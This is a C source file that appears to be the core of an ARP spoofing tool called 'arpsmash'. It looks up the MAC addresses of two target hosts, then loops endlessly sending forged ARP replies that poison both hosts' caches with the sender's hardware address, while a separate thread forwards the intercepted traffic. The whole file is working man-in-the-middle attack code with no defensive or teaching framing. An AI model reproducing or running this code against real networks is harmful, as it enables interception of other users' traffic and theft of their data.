#include "arpsmash.h"

int doarp()  {
	int ip4addr;
	struct arp_hdr arp;
	
	pthread_t th,th_forward;
	__u8 *hw;
	t_hw=NULL;

	if ((sd=socket(PF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)))<0)  {
		fprintf (stderr,"*** Socket error: %s\n",strerror(errno));
		return -1;
	}

	dlink.sll_family=AF_PACKET;
	dlink.sll_protocol=htons(ETH_P_ARP);
	dlink.sll_ifindex=ifindex(ifc);
	dlink.sll_halen=ETH_ALEN;
	memset (dlink.sll_addr,0xFF,ETH_ALEN);

	if (bind(sd, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"*** Bind error: %s\n",strerror(errno));
		return -2;
	}

	arp.hw_format=htons(ARPHRD_ETHER);
	arp.prot_format=htons(ETH_P_IP);
	arp.hw_len=ETH_ALEN;
	arp.prot_len=4;
	arp.opcode=htons(ARPOP_REQUEST);

	ip4addr=inet_addr(get_ipv4_addr(ifc));
	memcpy (arp.ip_sender, (__u8*) &ip4addr, sizeof(arp.ip_sender));

	hw=get_hw_addr(ifc);
	memcpy (arp.hw_sender, (__u8*) hw, sizeof(arp.hw_sender));
	memset (arp.hw_target, 0xFF, sizeof(arp.hw_target));

	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));

	ip4addr=inet_addr(t1);
	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));
	
	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"\t*** Error in sendto: %s\n",strerror(errno));
		return -3;
	}

	signal(SIGUSR1,handle);
	pthread_create (&th,NULL,hw_addr,(void*) &ip4addr);
	sleep(TIMEOUT);
	
	if (!t_hw)  {
		fprintf (stderr,"\t*** Unable to get %s physical address: %s\n",t1,strerror(errno));
		return -4;
	}

	t1_hw = (__u8*) malloc(ETH_ALEN);
	memcpy (t1_hw,t_hw,ETH_ALEN);
	printf ("\t*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
			t1,
			t1_hw[0],
			t1_hw[1],
			t1_hw[2],
			t1_hw[3],
			t1_hw[4],
			t1_hw[5]
	);

	ip4addr=inet_addr(t2);
	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));

	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"\t*** Error in sendto: %s\n",strerror(errno));
		return -5;
	}

	t_hw=NULL;
	pthread_create (&th, NULL, hw_addr, (void*) &ip4addr);
	sleep(TIMEOUT);

	if (!t_hw)  {
		fprintf (stderr,"\t*** Unable to get %s physical address: %s\n",t2,strerror(errno));
		return -6;
	}

	t2_hw = (__u8*) malloc(ETH_ALEN);
	memcpy (t2_hw,t_hw,ETH_ALEN);
	printf ("\t*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
			t2,
			t2_hw[0],
			t2_hw[1],
			t2_hw[2],
			t2_hw[3],
			t2_hw[4],
			t2_hw[5]
			);

	pthread_create (&th_forward, NULL, forward, (void*) &dlink);
	signal(SIGINT,term);
	signal(SIGTERM,term);
	signal(SIGKILL,term);
	
	while(1)  {
		arp.opcode=htons(ARPOP_REPLY);
		memcpy (&arp.hw_sender, hw, ETH_ALEN);
		ip4addr=inet_addr(t2);
		memcpy (arp.ip_sender, &ip4addr, 4);

		memcpy (&arp.hw_target, t1_hw, ETH_ALEN);
		ip4addr=inet_addr(t1);
		memcpy (&arp.ip_target, &ip4addr, 4);

		if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
			fprintf (stderr,"*** Error in sendto: %s\n",strerror(errno));
			return -7;
		}

		ip4addr=inet_addr(t1);
		memcpy (arp.ip_sender, &ip4addr, 4);

		memcpy (&arp.hw_target, t2_hw, ETH_ALEN);
		ip4addr=inet_addr(t2);
		memcpy (&arp.ip_target, &ip4addr, 4);

		if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
			fprintf (stderr,"*** Error in sendto: %s\n",strerror(errno));
			return -8;
		}

		usleep(SEND_DELAY);
	}

	return 0;
}

int arpsmash (__u8* interface, __u8* addr1, __u8* addr2)  {
	ifc = strdup(interface);
	
	if (!(t1=get_host_addr(addr1)))  {
		fprintf (stderr,"*** Error - Unable to resolve %s\n",optarg);
		return -1;
	}

	if (!(t2=get_host_addr(addr2)))  {
		fprintf (stderr,"*** Error - Unable to resolve %s\n",optarg);
		return -1;
	}

	if (doarp()<0)
		return -1;
}

